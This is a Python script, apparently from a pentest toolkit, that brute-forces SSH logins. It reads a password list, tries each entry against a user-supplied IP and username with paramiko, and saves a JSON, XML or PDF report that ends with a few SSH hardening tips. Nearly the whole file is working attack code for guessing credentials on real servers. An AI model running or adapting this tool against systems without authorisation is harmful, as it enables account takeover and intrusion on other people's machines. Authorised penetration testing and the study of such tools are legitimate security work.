#!/usr/bin/env python3
# SSH Brute Force + Report

import paramiko
import socket
from colorama import init, Fore, Style
from fpdf import FPDF
import datetime
import json
import xml.etree.ElementTree as ET
import os

init(autoreset=True)

def try_ssh(ip, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ip, username=username, password=password, timeout=3)
        print(Fore.GREEN + f"[+] SUCCESS: {username}:{password}")
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(Fore.RED + f"[-] Failed: {username}:{password}")
    except socket.timeout:
        print(Fore.YELLOW + f"[!] Timeout while connecting to {ip}")
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")
    finally:
        client.close()
    return False

def save_report(data, format="json"):
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    log_dir = "/var/log/purpleshivatoolslog"
    os.makedirs(log_dir, exist_ok=True)
    base_name = os.path.join(log_dir, f"ssh_report_{timestamp}")

    if format == "json":
        with open(f"{base_name}.json", "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        print(Fore.CYAN + f"[+] Report saved: {base_name}.json")

    elif format == "xml":
        root = ET.Element("report")
        for key, value in data.items():
            el = ET.SubElement(root, key)
            el.text = str(value)
        tree = ET.ElementTree(root)
        tree.write(f"{base_name}.xml", encoding="utf-8", xml_declaration=True)
        print(Fore.CYAN + f"[+] Report saved: {base_name}.xml")

    elif format == "pdf":
        pdf = FPDF()
        pdf.add_page()

        pdf.set_font("Arial", "B", 16)
        pdf.cell(0, 10, "SSH Brute Force Report", ln=True, align="C")
        pdf.ln(10)

        pdf.set_font("Arial", "B", 12)
        pdf.cell(60, 10, "Field", 1)
        pdf.cell(130, 10, "Value", 1)
        pdf.ln()

        fields = [
            ("Target IP", data["ip"]),
            ("Username", data["username"]),
            ("Password File", data["password_file"]),
            ("Total Passwords Tested", str(data["passwords_tested"])),
            ("Credential Found", data["credential_found"]),
            ("Timestamp", data["timestamp"]),
        ]

        pdf.set_font("Arial", "", 12)
        for field, value in fields:
            pdf.cell(60, 10, field, 1)
            pdf.cell(130, 10, value, 1)
            pdf.ln()

        pdf.ln(10)
        pdf.set_font("Arial", "B", 12)
        pdf.cell(0, 10, "Mitigation Suggestions", ln=True)

        pdf.set_font("Arial", "", 11)
        mitigations = [
            "- Use public key authentication whenever possible.",
            "- Disable password login for root (PermitRootLogin in sshd_config).",
            "- Restrict SSH access by IP using firewalls.",
            "- Implement tools like fail2ban to block repeated login attempts.",
            "- Monitor authentication logs frequently (/var/log/auth.log).",
            "- Enable multi-factor authentication (MFA) when available."
        ]

        for item in mitigations:
            pdf.multi_cell(0, 8, item)

        pdf.output(f"{base_name}.pdf")
        print(Fore.CYAN + f"[+] Report saved: {base_name}.pdf")

def brute_force_ssh(ip, username, password_file, report_format="pdf"):
    print(Fore.CYAN + f"Starting brute force attack on {ip} with username '{username}'...")
    report_data = {
        "ip": ip,
        "username": username,
        "password_file": password_file,
        "passwords_tested": 0,
        "credential_found": "None",
        "timestamp": datetime.datetime.now().isoformat()
    }

    try:
        with open(password_file, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + f"Password file '{password_file}' not found.")
        return

    for password in passwords:
        report_data["passwords_tested"] += 1
        if try_ssh(ip, username, password):
            report_data["credential_found"] = f"{username}:{password}"
            print(Fore.GREEN + f"\n[+] Credential found: {username}:{password}")
            break

    save_report(report_data, report_format)
    print(Fore.YELLOW + "\n[-] Attack finished.")

if __name__ == "__main__":
    print(Fore.CYAN + Style.BRIGHT + "=== SSH Brute Force Attack ===\n")
    ip = input("Target IP: ").strip()
    username = input("Username: ").strip()
    password_file = input("Password file (e.g. passwords.txt): ").strip()
    format_choice = input("Report format (pdf/json/xml) [pdf]: ").strip().lower() or "pdf"

    brute_force_ssh(ip, username, password_file, format_choice)
